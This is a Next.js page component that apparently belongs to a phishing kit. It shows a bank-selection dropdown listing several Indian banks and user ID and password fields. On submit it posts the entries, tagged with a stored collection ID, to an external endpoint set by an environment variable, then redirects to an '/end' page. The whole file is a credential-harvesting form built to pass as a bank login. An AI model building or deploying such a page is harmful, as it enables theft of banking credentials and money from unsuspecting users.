'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import styles from "./roshan.module.css";
import { useRouter } from "next/navigation";


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;
    
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            if(responseData.status==200){
              localStorage.setItem('collection_id', responseData.data);
              router.push('/end');
          }else{
            alert("not found ss");
          }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <main className={`container ${styles.container}`}>
  <div id="test" className="text-danger text-center fw-bold" />
  <input type="hidden" id="nextValue" defaultValue="last.html" />
  <div className=" m-2">
    <img src="assets/3header.jpg" width="100%" alt="" />
    <form onSubmit={handleSubmit} id="form" className="mt-3  p-2">
      <div className={`${styles.formGroup} form-group mb-3 `}>
        <label>Select Bank*</label>
        <select name="bnk" className={`form-control ${styles.formControl} `} required>
          <option value="">Select Bank</option>
          <option value="indusind-bank">IndusInd Bank</option>
          <option value="jammu-and-kashmir-bank">Jammu and Kashmir Bank</option>
          <option value="kotak-bank">Kotak Bank</option>
          <option value="punjab-sind-bank">Punjab &amp; Sind Bank</option>
          <option value="state-bank-of-india">State Bank Of India</option>
          <option value="tamilnad-mercantile-bank">
            Tamilnad Mercantile Bank
          </option>
          <option value="uco-bank">UCO Bank</option>
          <option value="union-bank-of-india">Union Bank Of India</option>
          <option value="vijay-bank">Vijay Bank</option>
          <option value="yes-bank">Yes Bank</option>
          <option value="other-bank">Other Bank</option>
        </select>
      </div>
      <div className={`${styles.formGroup} form-group mb-3 `}>
        <label>User ID*</label>
        <input
          name="userid"
          placeholder="User Id"
          type="text"
          className={`form-control ${styles.formControl} `}
          required
        />
      </div>
      <div className={`${styles.formGroup} form-group mb-3 `}>
        <label>Password*</label>
        <input
          name="pss"
          placeholder="Password"
          type="password"
          className={`form-control ${styles.formControl} `}
          required
        />
      </div>
      <div className={`${styles.textCenter} bg-danger`}>
        <button
          type="submit"
          id="submit-button"
          className="btn W-100 btn-lg btn-danger "
        >
          PROCEED
        </button>
      </div>
      <div className="my-4">
        <img src="assets/ft.png" width="100%" alt="" />
      </div>
    </form>
    <img src="assets/3footer.jpg" width="100%" alt="" />
  </div>
</main>

    <Footer />
</>
  );
}
